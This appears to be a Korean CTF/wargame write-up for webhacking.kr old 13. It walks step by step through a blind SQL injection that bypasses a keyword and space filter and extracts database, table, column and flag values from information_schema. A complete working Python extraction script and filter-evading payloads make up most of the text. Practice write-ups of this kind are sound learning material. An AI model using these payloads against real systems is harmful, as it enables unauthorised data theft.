---
title: "webhacking.kr old 13 문제 풀이"
date: 2025-04-05 00:00:00 +0800
categories: [Wargame, Webhacking.kr]
tags: [cyber security, writeup, webhackingkr, web hacking, blind sql injection] 
description: webhacking.kr old 13 문제 풀이
---

[https://webhacking.kr/challenge/web-10/](https://webhacking.kr/challenge/web-10/)
# 문제 풀이
## 웹사이트 분석
사이트에 접속하면 쿼리와 플래그의 입력을 받는 인풋 박스가 2개 있다.<br />
플래그는 우선 알 수 없으니 쿼리에만 집중해야한다.<br />
### 쿼리
쿼리에 '1'을 입력해보면 결과를 보여주는 간단한 테이블이 나오고 결과가 1이라고 한다.<br />
'2'를 입력하면 결과가 0이라고 나옴과 동시에 테이블의 크기가 작아진다. 이게 문제를 푸는데에 도움을 주는 힌트인지는 모르겠지만 2를 입력했는데 0이라고 나온 것을 보면 아마도 2는 false라는 의미인 듯 하다.<br />
#### 필터링 문자 알아내기
최대한 다양한 값들을 입력해보았더니 특정 값을 넣었을 때 "no hack"이라는 문구와 함께 필터링에 걸리게 된다.<br />
전부는 아니지만 대충 필터되는 문자열들의 목록을 정리하면 아래와 같다.<br />
- +, -, \*, /, = 사칙연산 기호들
- \#
- @
- &
- 0x
- <, >
- space character
- like
- where
- union
- limit
- ascii
## 최종 풀이
### 취약점
해당 문제의 취약점 카테고리는 당연하게도 Blind SQL Injection이다.<br />

우리가 지금 가진 정보라고는 쿼리를 전달할 수 있고 필터링이 걸려있고 쿼리의 결과로는 참, 거짓만 알 수 있다는 것이다.<br />
Blind SQLI를 시도하려면 더 많은 정보가 필요한데 우리는 그걸 처음부터 얻어내야 한다.
### 테이블 길이와 이름 알아내기
```python
class Solver:
    def __init__(self):
        self.url = "https://webhacking.kr/challenge/web-10/?no="
        self.true_factor = "cellpadding"
        self.table_length = 14
        self.table_name = ""

    def getTableNameLength(self):
        for i in range(1, 100):
            query = f"if((select(length(min(table_name)))from(information_schema.tables))in({i}),1,0)"
            resp = requests.get(self.url + query)
            if self.true_factor in resp.text:
                self.table_length = i
                break
            
        print("Table Name's Length:", self.table_length)
    
    def getTableName(self):
        tmp_str = ""
        for i in range(1, self.table_length + 1):
            for letter in string.printable:
                # Result: CHARACTER_SETS
                query = f"if((select(ord(substr(min(table_name),{i},1)))from(information_schema.tables))in({ord(letter)}),1,0)"
                resp = requests.get(self.url + query)
                print(letter)
                if self.true_factor in resp.text:
                    tmp_str += letter
                    print("Found", letter)
                    break
        
        self.table_name = tmp_str
        print(self.table_name)
```
테이블의 길이와 이름을 알아내기 위해서 2개의 함수를 구현했다.<br />
MySQL의 metadata를 담고있는 information_schema를 이용했다. 하지만 해당 코드를 실행해보면 테이블의 길이로 14가 출력되고 이름은 "CHARACTER_SETS"이라고 출력된다.<br />
해당 테이블의 이름은 정상적인 이름이 아니라 MySQL이 기본적으로 가지고있는 메타 테이블 이름이기에 잘못된 정보를 얻어온 셈이다.<br />

함수를 잘 보면 `min(table_name)`을 사용하고 있는데 문자열을 대상으로 min() 연산을 수행하면 맨 앞글자의 사전적 우선순위를 따지기 때문에 정확한 방식은 아니다.<br />
혹시나 해서 max를 이용해 보아도 또 다른 메타테이블이 나올 뿐이다. 무엇이 됐든 특정 table_name을 지정하여 쿼리를 수행해야 하기 때문에 이러한 방식을 채택한 것인데 min, max 말고 다른 방안을 떠올려야 한다.<br />

더 많은 정보가 필요하기 때문에 DB 이름을 알아내는 함수가 필요할 것 같다.
#### DB 이름의 길이 알아내기
```python
 def getDBNameLength(self):
	for i in range(1, 100):
		query = f"if(length(database())in({i}),1,0)"
		resp = requests.get(self.url + query)
		if self.true_factor in resp.text:
			self.db_length = i
			break
	
	print("DB Name's Length:", self.db_length)
```
이러한 클래스를 하나 만들어주고 `getDBNameLength()` 함수를 호출해주면 길이가 7이라는 것을 알 수 있다.
#### DB 이름 알아내기
```python
def getdbname(self):
	temp_str = ""
	for i in range(1, self.db_length + 1):
		for letter in string.printable:
			print(letter)
			query = f"if(ord(substr(database(),{str(i)},1))in({ord(letter)}),1,0)"
			print(query)
			resp = requests.get(self.url + query)
			if self.true_factor in resp.text:
				print("found", letter)
				temp_str += letter
				break
	
	self.db_name = temp_str
	print("db name:", self.db_name)
```
이제 길이가 7이란걸 알아냈으니 해당 정보를 바탕으로 한 글자 한 글자 반복을 돌아주면서 Blind SQLI를 수행하는 코드를 작성했다.<br />
결과로 chall13이 출력되는 것이 확인된다. 지금 푸는 문제가 old_13번이기에 해당 DB 이름이 수상해보이는 것이 당연하다.<br />
#### DB 이름이 min() 함수로 잡히는지 확인
```python
query = f"if((select(ord(substr(min(table_schema),{i},1)))from(information_schema.tables))in({ord(letter)}),1,0)"
```
바로 위의 함수와 코드는 완전히 동일하게 하지만 쿼리 부분만 살짝 변형시켜보았다.<br />
`min(table_schema)` 값을 이용해서도 동일하게 "chall13" 값을 얻어낼 수 있는지 알아내기 위함이다.<br />
만일 해당 함수의 결과가 chall13이라면 min() 함수를 이용해서 우리가 얻고자하는 테이블 값을 얻어낼 수 있기 때문이다.<br />
#### 진짜 테이블 길이, 이름 알아내기
>`INFORMATION_SCHEMA` is a database within each MySQL instance, the place that stores information about all the other databases that the MySQL server maintains.

[MySQL 공식문서](https://dev.mysql.com/doc/refman/8.4/en/information-schema-introduction.html)에 의하면 information_schema는 MySQL 서버의 모든 데이터베이스 값이 들어있고 information_schema.tables의 경우에도 우리가 원하는 chall13 데이터베이스 이외의 테이블들이 들어있다는 것이다.<br />

그래서 chall13 데이터베이스의 특정 테이블 이름을 알아내려면 둘을 한데 묶어버려야 한다.<br />
##### 쿼리 살펴보기
이번엔 쿼리가 좀 복잡하여 코드 이전에 미리 설명하고 가야할 듯 하다.<br />

```python
# table name length
if((select(length(min(concat(table_schema,table_name))))from(information_schema.tables))in(i),1,0)
```
테이블의 이름을 알아내는 쿼리이다.<br />
여기서 `concat()` 함수를 이용하고 있는데 그 이유는 table_schema(DB 이름)와 table_name을 합쳐주어야 특정 DB의 테이블 값을 가져올 수 있기 때문이다.<br />

이 전에 DB의 이름이 min() 함수로 체크가 되는지 확인이 됐으니 `min(concat(table_schema, table_name))`으로 chall13 DB의 테이블 이름을 가져오는 것이다.<br />

결국 해당 SELECT문을 MySQL이 수행할 때에 `information_schema.tables`의 모든 table_schema + table_name 조합을 만들어 그 중 가장 작은(ascii 코드 기준으로 가장 작은 글자로 시작하는 문자열 "chall13RandomFlagValue" 조합을 반환한다는 것이다.<br />

이런식으로 우리는 데이터베이스 chall13에 들어있는 table_name을 읽어낼 수 있다.<br />

```python
# table name
if((select(ord(substr(min(concat(table_schema,table_name)),{i},1)))from(information_schema.tables))in({ord(letter)}),1,0)
```
이렇게 길이를 알아냈다면 비슷한 방식으로 이제 진짜 테이블 이름을 알아내면 된다.<br />

```python
def getTableNameLength(self):
	for i in range(1, 100):
		query = f"if((select(length(min(concat(table_schema,table_name))))from(information_schema.tables))in({i}),1,0)"
		resp = requests.get(self.url + query)
		if self.true_factor in resp.text:
			self.table_length = i
			break
		
	print("Table Name's Length:", self.table_length)

def getTableName(self):
	tmp_str = ""
	for i in range(8, self.table_length + 1):
		for letter in string.printable:
			query = f"if((select(ord(substr(min(concat(table_schema,table_name)),{i},1)))from(information_schema.tables))in({ord(letter)}),1,0)"
			resp = requests.get(self.url + query)
			print(letter)
			if self.true_factor in resp.text:
				tmp_str += letter
				print("Found", letter)
				break
	
	self.table_name = tmp_str
	print(self.table_name)
```
여기서 주목해야할 점은 `getTableName()` 함수에서 for문을 8부터 시작한다는 것이다.<br />
위에도 언급했듯 해당 쿼리의 결과값은 "chall13RandomFlagValue"이 될 것이고 앞의 "chall13"은 불필요한 값이기 때문에 그 다음인 8번째부터 값을 얻어오기 위함이다.<br />

이렇게 최종적으로 테이블 이름의 길이는 20이고 이름은 "flag_ab73376"이다.
### 컬럼 이름의 길이와 이름 알아내기
```python
if((select(length(min(concat(table_schema,column_name))))from(information_schema.columns))in(i),1,0)

if((select(ord(substr(min(concat(table_schema,column_name)),{i},1)))from(information_schema.columns))in({ord(letter)}),1,0)
```
위에서 테이블 길이, 이름을 구할 때의 쿼리와 거의 동일하다. column 값을 읽어오도록 조금만 변형하면 된다.<br />

```python
def getColumnNameLength(self):
	for i in range(1, 100):
		query = f"if((select(length(min(concat(table_schema,column_name))))from(information_schema.columns))in({i}),1,0)"
		resp = requests.get(self.url + query)
		if self.true_factor in resp.text:
			self.column_length = i
			break
	
	print(self.column_length)

def getColumnName(self):
	tmp_str = ""
	for i in range(8, self.column_length + 1):
		for letter in string.printable:
			query = f"if((select(ord(substr(min(concat(table_schema,column_name)),{i},1)))from(information_schema.columns))in({ord(letter)}),1,0)"
			resp = requests.get(self.url + query)
			if self.true_factor in resp.text:
				print("Found", letter)
				tmp_str += letter
				break
	
	self.column_name = tmp_str
	print(self.column_name)
```
### 최종 플래그 읽어오기
이제 테이블 이름도 알아냈고 컬럼의 이름도 알아냈다.<br />
플래그 이름의 길이와 이름을 알아내야 하는데 문제는 해당 컬럼에 플래그 이외에 여러 값이 존재할지도 모른다는 것이다.<br />

그렇다면 이번에도 min 혹은 max 함수를 이용해야 한다.<br />
문제 사이트에 플래그를 입력하는 곳을 보면 "FLAG{something}"으로 placeholder가 있다.<br />
아마 DB에도 "FLAG{"로 시작하는 값이 있을 것으로 예상되고 'F'는 ascii 상으로 꽤나 높기 때문에 이번엔 max()을 사용해보았다.<br />

```python
# flag length
if((select(length(max(flag_3a55b31d)))from(flag_ab733768))in({i}),1,0)

# flag
if((select(ord(substr(max(flag_3a55b31d),{i},1)))from(flag_ab733768))in({ord(letter)}),1,0)
```
이렇게 쿼리를 작성하고 자동화 코드를 실행하면 플래그의 길이와 진짜 값이 출력된다.<br />
다행히도 max 함수를 이용하는 추측이 맞았던 것이다.<br />
### 최종 코드 
```python
import requests
import string

class Solver:
    def __init__(self):
        self.url = "https://webhacking.kr/challenge/web-10/?no="
        self.true_factor = "cellpadding"
        self.db_length = 7
        self.db_name = "chall13"
        self.table_length = 20
        self.table_name = "flag_ab733768"
        self.column_length = 20
        self.column_name = "flag_3a55b31d"
        self.flag_length = 27
        self.flag = "REDACTED"
    
    def getDBNameLength(self):
        for i in range(1, 100):
            query = f"if(length(database())in({i}),1,0)"
            resp = requests.get(self.url + query)
            if self.true_factor in resp.text:
                self.db_length = i
                break
        
        print("DB Name's Length:", self.db_length)

    def getDBName(self):
        temp_str = ""
        for i in range(1, self.db_length + 1):
            for letter in string.printable:
                print(letter)
                query = f"if((select(ord(substr(min(table_schema),{i},1)))from(information_schema.tables))in({ord(letter)}),1,0)"
                resp = requests.get(self.url + query)
                if self.true_factor in resp.text:
                    print("Found", letter)
                    temp_str += letter
                    break
        
        self.db_name = temp_str
        print("DB Name:", self.db_name)
    
    def getTableNameLength(self):
        for i in range(1, 100):
            query = f"if((select(length(min(concat(table_schema,table_name))))from(information_schema.tables))in({i}),1,0)"
            resp = requests.get(self.url + query)
            if self.true_factor in resp.text:
                self.table_length = i
                break
            
        print("Table Name's Length:", self.table_length)
    
    def getTableName(self):
        tmp_str = ""
        for i in range(8, self.table_length + 1):
            for letter in string.printable:
                query = f"if((select(ord(substr(min(concat(table_schema,table_name)),{i},1)))from(information_schema.tables))in({ord(letter)}),1,0)"
                resp = requests.get(self.url + query)
                print(letter)
                if self.true_factor in resp.text:
                    tmp_str += letter
                    print("Found", letter)
                    break
        
        self.table_name = tmp_str
        print(self.table_name)
    
    def getColumnNameLength(self):
        for i in range(1, 100):
            query = f"if((select(length(min(concat(table_schema,column_name))))from(information_schema.columns))in({i}),1,0)"
            resp = requests.get(self.url + query)
            if self.true_factor in resp.text:
                self.column_length = i
                break
        
        print(self.column_length)
    
    def getColumnName(self):
        tmp_str = ""
        for i in range(8, self.column_length + 1):
            for letter in string.printable:
                query = f"if((select(ord(substr(min(concat(table_schema,column_name)),{i},1)))from(information_schema.columns))in({ord(letter)}),1,0)"
                resp = requests.get(self.url + query)
                if self.true_factor in resp.text:
                    print("Found", letter)
                    tmp_str += letter
                    break
        
        self.column_name = tmp_str
        print(self.column_name)
    
    def getFlagLength(self):
        for i in range(1, 100):
            query = f"if((select(length(max({self.column_name})))from({self.table_name}))in({i}),1,0)"
            resp = requests.get(self.url + query)
            if self.true_factor in resp.text:
                self.flag_length = i
                break
                
        print(self.flag_length)
    
    def getFlag(self):
        tmp_str = "FLAG{"
        for i in range(6, self.flag_length + 1):
            for letter in string.printable:
                query = f"if((select(ord(substr(max({self.column_name}),{i},1)))from({self.table_name}))in({ord(letter)}),1,0)"
                resp = requests.get(self.url + query)
                if self.true_factor in resp.text:
                    print("Found", letter)
                    tmp_str += letter
                    break
        
        self.flag = tmp_str
        print(self.flag)
```
# 배운 것
MySQL의 System Table Fingerprinting에 대해 배우기만 했지 직접 실습해보지는 못했다.<br />
이번 기회에 확실하게 경험할 수 있었다.